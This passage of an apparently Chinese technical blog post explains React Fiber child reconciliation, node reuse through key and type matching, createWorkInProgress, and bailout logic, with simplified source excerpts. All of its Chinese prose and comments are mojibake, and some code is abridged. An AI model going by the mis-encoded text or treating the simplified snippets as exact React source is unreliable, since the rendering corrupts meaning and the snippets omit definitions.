class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> oldFiber = currentFirstChild; <span class="hljs-comment">// æ—§ Fiber é“¾è¡¨å¤´èŠ‚ç‚¹</span><br><span class="hljs-keyword">let</span> lastPlacedIndex = <span class="hljs-number">0</span>; <span class="hljs-comment">// è®°å½•æœ€åä¸€ä¸ªæ— éœ€ç§»åŠ¨çš„èŠ‚ç‚¹ç´¢å¼•</span><br><span class="hljs-keyword">let</span> newIdx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">let</span> nextOldFiber = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// ç¬¬ä¸€è½®éå†ï¼šé¡ºåºåŒ¹é… key ç›¸åŒçš„èŠ‚ç‚¹</span><br><span class="hljs-keyword">for</span> (; oldFiber !== <span class="hljs-literal">null</span> &amp;&amp; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">if</span> (oldFiber.<span class="hljs-property">index</span> &gt; newIdx) &#123;<br>    nextOldFiber = oldFiber;<br>    oldFiber = <span class="hljs-literal">null</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    nextOldFiber = oldFiber.<span class="hljs-property">sibling</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// å°è¯•å¤ç”¨æ—§ Fiberï¼ˆkey &amp; type åŒ¹é…ï¼‰</span><br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateSlot</span>(returnFiber, oldFiber, newChildren[newIdx], lanes);<br><br>  <span class="hljs-keyword">if</span> (newFiber === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// key ä¸åŒ¹é…ï¼Œè·³å‡ºå¾ªç¯</span><br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// æ ‡è®°æ˜¯å¦éœ€è¦ç§»åŠ¨</span><br>  lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–ç‚¹ï¼š</p><ul><li>updateSlotï¼šæ£€æŸ¥ key å’Œ typeï¼ŒåŒ¹é…åˆ™å¤ç”¨æ—§ Fiberï¼Œå¦åˆ™è¿”å›null</li><li>placeChildï¼šæ¯”è¾ƒæ—§ Fiber çš„ index å’Œ newIdxï¼Œå†³å®šæ˜¯å¦æ ‡è®° placementï¼ˆç§»åŠ¨ï¼‰</li></ul><p>é˜¶æ®µäºŒï¼šå¤„ç†å‰©ä½™èŠ‚ç‚¹<br>æƒ…å†µä¸€ï¼šæ–°èŠ‚ç‚¹å·²éå†å®Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (newIdx === newChildren.<span class="hljs-property">length</span>) &#123;<br>  <span class="hljs-comment">// åˆ é™¤å‰©ä½™æ—§èŠ‚ç‚¹</span><br>  <span class="hljs-title function_">deleteRemainingChildren</span>(returnFiber, oldFiber);<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–ç‚¹ï¼šç›´æ¥åˆ é™¤æœªåŒ¹é…çš„æ—§èŠ‚ç‚¹ï¼Œæ— éœ€è¿›ä¸€æ­¥æ¯”è¾ƒ</p><p>æƒ…å†µäºŒï¼šæ—§èŠ‚ç‚¹å·²éå†å®Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (oldFiber === <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-comment">// åˆ›å»ºå‰©ä½™æ–°èŠ‚ç‚¹</span><br>  <span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>    <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">createChild</span>(returnFiber, newChildren[newIdx], lanes);<br>    <span class="hljs-comment">// é“¾æ¥åˆ°é“¾è¡¨</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–ç‚¹ï¼šå‰©ä½™æ–°èŠ‚ç‚¹ç›´æ¥åˆ›å»ºï¼Œæ— éœ€åŒ¹é…</p><p>æƒ…å†µä¸‰ï¼šæ–°æ—§èŠ‚ç‚¹å‡æœªéå†å®Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ„å»ºæ—§èŠ‚ç‚¹ Map&lt;key|index, Fiber&gt;</span><br><span class="hljs-keyword">const</span> existingChildren = <span class="hljs-title function_">mapRemainingChildren</span>(oldFiber);<br><br><span class="hljs-comment">// éå†å‰©ä½™æ–°èŠ‚ç‚¹ï¼Œå°è¯•ä» Map ä¸­åŒ¹é…</span><br><span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateFromMap</span>(<br>    existingChildren,<br>    returnFiber,<br>    newIdx,<br>    newChildren[newIdx],<br>    lanes,<br>  );<br><br>  <span class="hljs-keyword">if</span> (newFiber !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// æ ‡è®°ç§»åŠ¨æˆ–å¤ç”¨</span><br>    lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// åˆ é™¤æœªåŒ¹é…çš„æ—§èŠ‚ç‚¹</span><br>existingChildren.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">deleteChild</span>(returnFiber, child));<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–ç‚¹ï¼š</p><ul><li>mapRemainingChildrenï¼šå°†å‰©ä½™æ—§èŠ‚ç‚¹å­˜å…¥ mapï¼Œkey ä¼˜å…ˆï¼Œæ—  key æ—¶ä½¿ç”¨ index</li><li>updateFromMapï¼šä» map ä¸­æŸ¥æ‰¾å¯å¤ç”¨èŠ‚ç‚¹ï¼Œå‡å°‘éå†æ¬¡æ•°</li><li>placeChildï¼šä»…å¯¹éœ€è¦ç§»åŠ¨çš„èŠ‚ç‚¹æ ‡è®° placementï¼Œå‡å°‘ä¸å¿…è¦çš„ DOM æ“ä½œ</li></ul><p><strong>keyçš„æ ¸å¿ƒä½œç”¨</strong></p><ol><li>ç²¾ç¡®åŒ¹é…ï¼škey æ˜¯ React ä¸­èŠ‚ç‚¹çš„å”¯ä¸€æ ‡è¯†ï¼Œåº”é¿å…å¤ç”¨</li><li>é«˜æ•ˆå¤ç”¨ï¼šé€šè¿‡ key ç›´æ¥å®šä½æ—§èŠ‚ç‚¹ï¼Œè€Œéé€’å½’æ¯”è¾ƒ</li><li>ç§»åŠ¨ä¼˜åŒ–ï¼škey ç›¸åŒçš„èŠ‚ç‚¹å³ä½¿ä½ç½®å‘ç”Ÿæ”¹å˜ï¼Œä¹Ÿèƒ½è¢«æ­£ç¡®æ ‡è®°ç§»åŠ¨ï¼Œè€Œéåˆ é™¤é‡å»º</li></ol><p><strong>æ€§èƒ½å¯¹æ¯”ï¼ˆä¼ ç»Ÿè™šæ‹Ÿ DOM Diff å¯¹æ¯” Fiber Diffï¼‰</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">ä¼ ç»Ÿ Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">æ—¶é—´å¤æ‚åº¦</td><td align="left">O(nÂ²)(åŒæŒ‡é’ˆå¾ªç¯)</td><td align="left">O(n) (mapæŸ¥æ‰¾)</td></tr><tr><td align="left">DOM æ“ä½œ</td><td align="left">å¯èƒ½å¤šæ¬¡ç§»åŠ¨&#x2F;é‡å»º</td><td align="left">ä»…è¿›è¡Œå¿…è¦æ›´æ–°ï¼ˆplacement&#x2F;deletionï¼‰</td></tr><tr><td align="left">çŠ¶æ€ä¿ç•™</td><td align="left">ä»…å¤ç”¨ DOM</td><td align="left">ç»„ä»¶çŠ¶æ€ã€hooksã€refå…¨ä¿ç•™</td></tr><tr><td align="left">åˆ—è¡¨æ¸²æŸ“</td><td align="left">æ€§èƒ½éšåˆ—è¡¨é•¿åº¦ä¸‹é™æ˜æ˜¾</td><td align="left">ä¸‡çº§åˆ—è¡¨ä»ç„¶æµç•…</td></tr></tbody></table><h3 id="èŠ‚ç‚¹å¤ç”¨ç­–ç•¥ä¸bailoutæœºåˆ¶"><a href="#èŠ‚ç‚¹å¤ç”¨ç­–ç•¥ä¸bailoutæœºåˆ¶" class="headerlink" title="èŠ‚ç‚¹å¤ç”¨ç­–ç•¥ä¸bailoutæœºåˆ¶"></a>èŠ‚ç‚¹å¤ç”¨ç­–ç•¥ä¸bailoutæœºåˆ¶</h3><p><strong>å¤ç”¨æ¡ä»¶ï¼škey å’Œ type åŒåŒ¹é…</strong></p><p>æºç å…¥å£ï¼šreconcileChildFibers -&gt; reconcileChildrenArray &#x2F; updateSlot<br>æ ¸å¿ƒä»£ç é€»è¾‘ï¼ˆç®€åŒ–è‡ªReactFiberChild.jsï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSlot</span>(<span class="hljs-params">returnFiber: Fiber, oldFiber: Fiber | <span class="hljs-literal">null</span>, newChild: any, lanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// Update the fiber if the keys match, otherwise return null.</span><br>  <span class="hljs-keyword">const</span> key = oldFiber !== <span class="hljs-literal">null</span> ? oldFiber.<span class="hljs-property">key</span> : <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newChild === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; newChild !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">key</span> === key) &#123;<br>      <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">type</span> === oldFiber?.<span class="hljs-property">type</span>) &#123;<br>        <span class="hljs-comment">// å¤ç”¨æ—§ Fiberï¼ˆä¿ç•™ state/DOM/hooksï¼‰</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">useFiber</span>(oldFiber, newChild.<span class="hljs-property">props</span>);<br>      &#125;<br>      <span class="hljs-comment">// key åŒ¹é…ä½† type ä¸åŒ¹é…ï¼Œé”€æ¯æ—§èŠ‚ç‚¹</span><br>      <span class="hljs-title function_">deleteChild</span>(returnFiber, oldFiber);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// ä¸åŒ¹é…åˆ™åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤ç”¨è§„åˆ™</strong></p><ul><li>key å’Œ type éƒ½ç›¸åŒï¼šè°ƒç”¨ useFiber å…‹éš†æ—§èŠ‚ç‚¹ï¼Œä¿ç•™ï¼š<ul><li>ç»„ä»¶å®ä¾‹ï¼ˆclassç»„ä»¶ï¼‰å’Œ hooks é“¾è¡¨ï¼ˆå‡½æ•°å¼ç»„ä»¶ï¼‰</li><li>DOM å¼•ç”¨ï¼ˆé¿å…é‡å»ºï¼‰</li><li>çŠ¶æ€å’Œrefs</li></ul></li><li>key ç›¸åŒï¼Œtype ä¸åŒï¼šé”€æ¯æ—§èŠ‚ç‚¹ï¼ˆæ ‡è®°deletionï¼‰ï¼Œåˆ›å»ºæ–°èŠ‚ç‚¹</li><li>key ä¸åŒï¼šç›´æ¥åˆ›å»ºæ–°èŠ‚ç‚¹</li></ul><p><strong>useFiberå®ç°ï¼ˆçŠ¶æ€ä¿ç•™æ ¸å¿ƒï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFiber</span>(<span class="hljs-params">fiber: Fiber, pendingProps: mixed</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-comment">// We currently set sibling to null and index to 0 here because it is easy</span><br>  <span class="hljs-comment">// to forget to do before returning it. E.g. for the single child case.</span><br>  <span class="hljs-keyword">const</span> clone = <span class="hljs-title function_">createWorkInProgress</span>(fiber, pendingProps);<br>  clone.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// é‡ç½®ç´¢å¼•</span><br>  clone.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// æ–­å¼€å…„å¼Ÿé“¾æ¥</span><br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createWorkInProgress</span>(<span class="hljs-params">current: Fiber, pendingProps: any</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-keyword">let</span> workInProgress = current.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">if</span> (workInProgress === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We use a double buffering pooling technique because we know that we&#x27;ll</span><br>    <span class="hljs-comment">// only ever need at most two versions of a tree. We pool the &quot;other&quot; unused</span><br>    <span class="hljs-comment">// node that we&#x27;re free to reuse. This is lazily created to avoid allocating</span><br>    <span class="hljs-comment">// extra objects for things that are never updated. It also allow us to</span><br>    <span class="hljs-comment">// reclaim the extra memory if needed.</span><br>    workInProgress = <span class="hljs-title function_">createFiber</span>(<br>      current.<span class="hljs-property">tag</span>,<br>      pendingProps,<br>      current.<span class="hljs-property">key</span>,<br>      current.<span class="hljs-property">mode</span>,<br>    );<br>    workInProgress.<span class="hljs-property">elementType</span> = current.<span class="hljs-property">elementType</span>;<br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br>    workInProgress.<span class="hljs-property">stateNode</span> = current.<span class="hljs-property">stateNode</span>;<br><br>    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†æºç </span><br><br>    workInProgress.<span class="hljs-property">alternate</span> = current;<br>    current.<span class="hljs-property">alternate</span> = workInProgress;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress.<span class="hljs-property">pendingProps</span> = pendingProps;<br>    <span class="hljs-comment">// Needed because Blocks store data on type.</span><br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br><br>    <span class="hljs-comment">// We already have an alternate.</span><br>    <span class="hljs-comment">// Reset the effect tag.</span><br>    workInProgress.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br><br>    <span class="hljs-comment">// The effects are no longer valid.</span><br>    workInProgress.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>    workInProgress.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>      <span class="hljs-comment">// We intentionally reset, rather than copy, actualDuration &amp; actualStartTime.</span><br>      <span class="hljs-comment">// This prevents time from endlessly accumulating in new commits.</span><br>      <span class="hljs-comment">// This has the downside of resetting values for different priority renders,</span><br>      <span class="hljs-comment">// But works for yielding (the common case) and should support resuming.</span><br>      workInProgress.<span class="hljs-property">actualDuration</span> = -<span class="hljs-number">0</span>;<br>      workInProgress.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1.1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// Reset all effects except static ones.</span><br>  <span class="hljs-comment">// Static effects are not specific to a render.</span><br>  workInProgress.<span class="hljs-property">flags</span> = current.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">StaticMask</span>;<br>  workInProgress.<span class="hljs-property">childLanes</span> = current.<span class="hljs-property">childLanes</span>;<br>  workInProgress.<span class="hljs-property">lanes</span> = current.<span class="hljs-property">lanes</span>;<br><br>  workInProgress.<span class="hljs-property">child</span> = current.<span class="hljs-property">child</span>;<br>  workInProgress.<span class="hljs-property">memoizedProps</span> = current.<span class="hljs-property">memoizedProps</span>;<br>  workInProgress.<span class="hljs-property">memoizedState</span> = current.<span class="hljs-property">memoizedState</span>;<br>  workInProgress.<span class="hljs-property">updateQueue</span> = current.<span class="hljs-property">updateQueue</span>;<br><br>  <span class="hljs-comment">// Clone the dependencies object. This is mutated during the render phase, so</span><br>  <span class="hljs-comment">// it cannot be shared with the current fiber.</span><br>  <span class="hljs-keyword">const</span> currentDependencies = current.<span class="hljs-property">dependencies</span>;<br>  workInProgress.<span class="hljs-property">dependencies</span> =<br>    currentDependencies === <span class="hljs-literal">null</span><br>      ? <span class="hljs-literal">null</span><br>      : __DEV__<br>        ? &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>            <span class="hljs-attr">_debugThenableState</span>: currentDependencies.<span class="hljs-property">_debugThenableState</span>,<br>          &#125;<br>        : &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>          &#125;;<br><br>  <span class="hljs-comment">// These will be overridden during the parent&#x27;s reconciliation</span><br>  workInProgress.<span class="hljs-property">sibling</span> = current.<span class="hljs-property">sibling</span>;<br>  workInProgress.<span class="hljs-property">index</span> = current.<span class="hljs-property">index</span>;<br>  workInProgress.<span class="hljs-property">ref</span> = current.<span class="hljs-property">ref</span>;<br>  workInProgress.<span class="hljs-property">refCleanup</span> = current.<span class="hljs-property">refCleanup</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    workInProgress.<span class="hljs-property">selfBaseDuration</span> = current.<span class="hljs-property">selfBaseDuration</span>;<br>    workInProgress.<span class="hljs-property">treeBaseDuration</span> = current.<span class="hljs-property">treeBaseDuration</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†æºç </span><br><br>  <span class="hljs-keyword">return</span> workInProgress;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®ç‚¹ï¼š</p><ul><li>é€šè¿‡ alternate æŒ‡é’ˆå¤ç”¨æ—§ Fiber å¯¹è±¡ï¼ˆåŒç¼“å†²æŠ€æœ¯ï¼‰</li><li>ä¿ç•™ stateNodeï¼ˆDOM&#x2F;å®ä¾‹ï¼‰å’Œ memoizedStateï¼ˆçŠ¶æ€ï¼‰</li></ul><p><strong>bailout æœºåˆ¶ï¼ˆè·³è¿‡å­æ ‘åè°ƒï¼‰æ ¸å¿ƒé€»è¾‘</strong></p><p>æºç å…¥å£ï¼šbeginWork -&gt; updateFunctionComponent &#x2F; updateClassComponent</p><p>æ ¸å¿ƒä»£ç é€»è¾‘ï¼ˆç²¾ç®€è‡ªReactFiberBeginWork.jsï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateFunctionComponent</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: <span class="hljs-literal">null</span> | Fiber,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  Component: any,</span><br><span class="hljs-params">  nextProps: any,</span><br><span class="hljs-params">  renderLanes: Lanes,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>  <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (<br>    oldProps === newProps &amp;&amp; <span class="hljs-comment">// Props æµ…æ¯”è¾ƒ</span><br>    !<span class="hljs-title function_">hasLegacyContextChanged</span>() &amp;&amp; <span class="hljs-comment">// æ—§ Context æœªå˜</span><br>    workInProgress.<span class="hljs-property">type</span> === current.<span class="hljs-property">type</span> &amp;&amp; <span class="hljs-comment">// ç»„ä»¶ç±»å‹ç›¸åŒ</span><br>    !<span class="hljs-title function_">includesSomeLane</span>(renderLanes, current.<span class="hljs-property">lanes</span>) <span class="hljs-comment">// æ— é«˜ä¼˜å…ˆçº§æ›´æ–°</span><br>  ) &#123;<br>    didReceiveUpdate = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span> &amp;&amp; !didReceiveUpdate) &#123;<br>    <span class="hljs-title function_">bailoutHooks</span>(current, workInProgress, renderLanes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(current, workInProgress, renderLanes);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getIsHydrating</span>() &amp;&amp; hasId) &#123;<br>    <span class="hljs-title function_">pushMaterializedTreeId</span>(workInProgress);<br>  &#125;<br><br>  <span class="hljs-comment">// React DevTools reads this flag.</span><br>  workInProgress.<span class="hljs-property">flags</span> |= <span class="hljs-title class_">PerformedWork</span>;<br>  <span class="hljs-title function_">reconcileChildren</span>(current, workInProgress, nextChildren, renderLanes);<br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>bailout æ¡ä»¶</strong></p><ul><li>props æµ…å±‚ç›¸ç­‰ï¼ˆObject.isæ¯”è¾ƒï¼‰</li><li>context å€¼æœªå˜åŒ–ï¼ˆæ–°æ—§ Provider å€¼æµ…æ¯”è¾ƒï¼‰ã€‚</li><li>ç»„ä»¶ç±»å‹ç›¸åŒï¼ˆæ—  type å˜åŒ–ï¼‰ã€‚</li><li>æ— æ›´é«˜ä¼˜å…ˆçº§æ›´æ–°ï¼ˆé€šè¿‡ lanes æ¨¡å‹åˆ¤æ–­ï¼‰</li></ul><p><strong>bailoutOnAlreadyFinishedWork å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(<span class="hljs-params">current: Fiber, workInProgress: Fiber, renderLanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-title function_">cloneChildFibers</span>(current, workInProgress); <span class="hljs-comment">// å…‹éš†å­æ ‘</span><br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®æ“ä½œï¼š</p><ul><li>å­æ ‘å…‹éš†ï¼šç›´æ¥æ‹·è´ current æ ‘çš„å­é“¾è¡¨åˆ° workInProgress æ ‘ã€‚</li><li>å‰¯ä½œç”¨ç»§æ‰¿ï¼šä¿ç•™æ—§ Fiber çš„ subtreeFlagsï¼ˆæ ‡è®°å­æ ‘æ˜¯å¦éœ€è¦æ›´æ–°ï¼‰ã€‚</li></ul><p><strong>æ€§èƒ½ä¼˜åŒ–å¯¹æ¯”</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">ä¼ ç»Ÿ Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">èŠ‚ç‚¹å¤ç”¨</td><td align="left">ä»…å¤ç”¨ DOM</td><td align="left">çŠ¶æ€+DOM+hooks</td></tr><tr><td align="left">æ¡ä»¶åˆ¤æ–­</td><td align="left">æ— ç³»ç»ŸåŒ– bailout</td><td align="left">å¤šç»´åº¦æ£€æµ‹ï¼ˆprops&#x2F;context&#x2F;ä¼˜å…ˆçº§ï¼‰</td></tr><tr><td align="left">å­æ ‘è·³è¿‡</td><td align="left">ä¸å¯èƒ½</td><td align="left">ç›´æ¥å…‹éš†æ•´æ£µå­æ ‘ï¼ˆO(1) æ“ä½œï¼‰</td></tr><tr><td align="left">æ—¶é—´å¤æ‚åº¦</td><td align="left">O(nÂ²)ï¼ˆé€’å½’ï¼‰</td><td align="left">O(n)ï¼ˆmapæŸ¥æ‰¾+é“¾è¡¨éå†ï¼‰</td></tr></tbody></table><h1 id="ç¬¬å››ç« ï¼šFiberçš„è°ƒåº¦ç³»ç»Ÿä¸å¹¶å‘æ¨¡å¼"><a href="#ç¬¬å››ç« ï¼šFiberçš„è°ƒåº¦ç³»ç»Ÿä¸å¹¶å‘æ¨¡å¼" class="headerlink" title="ç¬¬å››ç« ï¼šFiberçš„è°ƒåº¦ç³»ç»Ÿä¸å¹¶å‘æ¨¡å¼"></a>ç¬¬å››ç« ï¼šFiberçš„è°ƒåº¦ç³»ç»Ÿä¸å¹¶å‘æ¨¡å¼</h1><h2 id="4-1-è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„å®ç°åŸç†"><a href="#4-1-è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„å®ç°åŸç†" class="headerlink" title="4.1 è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„å®ç°åŸç†"></a>4.1 